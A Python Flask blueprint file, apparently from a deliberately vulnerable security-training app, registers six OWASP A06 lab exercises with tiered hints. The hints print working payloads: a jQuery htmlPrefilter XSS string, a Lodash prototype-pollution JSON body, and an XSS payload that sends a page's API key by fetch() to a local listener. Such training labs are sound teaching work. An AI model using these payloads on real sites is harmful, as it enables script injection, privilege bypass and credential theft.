from flask import Blueprint

a06_bp = Blueprint(
    "a06_vulnerable_components", __name__, template_folder="templates", url_prefix="/a06"
)

from app.categories.a06_vulnerable_components import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a06_vulnerable_components",
        short_id="A06",
        title="Vulnerable and Outdated Components",
        blurb="Outdated, unpatched dependencies with known public CVEs still running in production.",
        blueprint_name="a06_vulnerable_components",
        overview_endpoint="a06_vulnerable_components.overview",
        examples=[
            ExampleNav(
                id="version-disclosure",
                title="Component Version Disclosure",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.component_inventory",
                hints=[
                    "This page was built as an internal ops dashboard and never got the authentication it was supposed to have. What does an unauthenticated visitor see if they just visit it directly?",
                    "No login is required to reach /a06/component-inventory — just navigate there and read what it shows you.",
                    "Visit /a06/component-inventory and note the exact versions listed for \"jQuery (Legacy Widgets bundle)\" and \"Lodash (Legacy Widgets bundle)\" — then look each one up against a public vulnerability database like the GitHub Advisory Database or NVD to find their known CVEs.",
                ],
            ),
            ExampleNav(
                id="outdated-jquery-detection",
                title="Outdated Vulnerable JS Library Detection",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.legacy_widgets",
                hints=[
                    "This category's other jQuery examples load a script from somewhere — what if you fetched that file directly instead of just using it?",
                    "Look at the page source of any \"Vulnerable Library: jQuery\" example and find the <script src=...> tag pointing at /static/vendor/jquery-vulnerable/.",
                    "Fetch /static/vendor/jquery-vulnerable/jquery-1.12.4.js directly and read its first few lines — jQuery's own header comment states the exact version, v1.12.4, which you can then cross-reference against a public CVE database (it falls inside the range affected by GHSA-gxr4-xjj5-5px2 / CVE-2020-11022 / CVE-2020-11023).",
                ],
            ),
            ExampleNav(
                id="jquery-dom-xss",
                title="jQuery DOM XSS via Vulnerable htmlPrefilter",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.comment_preview",
                hints=[
                    "This widget's server-side code has no obvious bug — the flaw lives inside the vendored jQuery library's own HTML-handling logic, specifically the code path .html() relies on to make raw input \"safe\".",
                    "jQuery's htmlPrefilter (versions before 3.5.0) has a regex that mishandles a specific kind of self-closing tag, letting markup after it escape its intended parsing context. Try a self-closing <style /> tag followed by something that executes on error.",
                    "Paste this exact payload into the comment box and click Preview: <style><style /><img src=1 onerror=alert(document.domain)> — the self-closing <style /> gets rewritten by htmlPrefilter in a way that lets the following <img onerror=...> execute as live markup instead of staying inert style text.",
                ],
            ),
            ExampleNav(
                id="lodash-prototype-pollution",
                title="Lodash Prototype Pollution via _.defaultsDeep()",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.notification_preferences",
                hints=[
                    "This feature merges your submitted JSON over some default settings using a Lodash deep-merge function. What happens if your JSON includes a key with special meaning in JavaScript's own object model, like \"constructor\" or \"prototype\"?",
                    "Lodash's _.defaultsDeep() before 4.17.12 walks every key in your input recursively, including \"constructor\" and \"prototype\", without checking if it's about to write onto Object.prototype instead of a normal data object.",
                    "Paste this exact payload into the preferences box and click Apply: {\"constructor\": {\"prototype\": {\"isAdmin\": true}}} — then watch the \"Fresh object check\" panel flip to true, proving a brand-new, unrelated object now inherits a property you never gave it because Object.prototype itself got polluted.",
                ],
            ),
            ExampleNav(
                id="jquery-xss-session-theft",
                title="jQuery DOM XSS Chained to Session Token Theft",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.account_preview",
                hints=[
                    "This page has the exact same vulnerable comment-preview widget as the Medium-tier jQuery DOM XSS example — but now there's something genuinely valuable sitting in the DOM right next to it. What could a real attacker do with script execution beyond just popping an alert box?",
                    "Once you can execute arbitrary JavaScript via the same htmlPrefilter flaw, you can read anything else on the page (like the element showing \"Your API Key\") and send it somewhere the attacker controls, e.g. via fetch().",
                    "Start a listener to act as the attacker's collector: python3 -m http.server 9000 in a separate terminal.",
                    "Paste this exact payload into the comment box and click Preview: <style><style /><img src=1 onerror=\"fetch('http://127.0.0.1:9000/collect?key=' + encodeURIComponent(document.getElementById('api-key-value').innerText))\"> — watch your listener's access log receive a real GET request carrying the API key, exfiltrated by your own browser with no further interaction from you.",
                ],
            ),
            ExampleNav(
                id="prototype-pollution-bypass",
                title="Prototype Pollution Bypasses a Client-Side Access Check",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.admin_tools_panel",
                hints=[
                    "This page reuses the exact same vulnerable Lodash merge from the Medium-tier Prototype Pollution example — but here, something that reads the polluted property actually gates real functionality instead of just a decorative flag. What might that be?",
                    "There's a hidden \"Admin Tools\" section on this page, and a client-side check somewhere decides whether to reveal it based on a property of a freshly-created object.",
                    "Paste this exact payload into the preferences box and click Apply: {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
                    "The visibility check is roughly if (({}).isAdmin) { showPanel(); } against a brand-new empty object — once Object.prototype.isAdmin is polluted by your payload, that check (and every other naive check like it across the whole page) starts passing, revealing the hidden Admin Tools panel with no legitimate access at all.",
                ],
            ),
        ],
    )
)
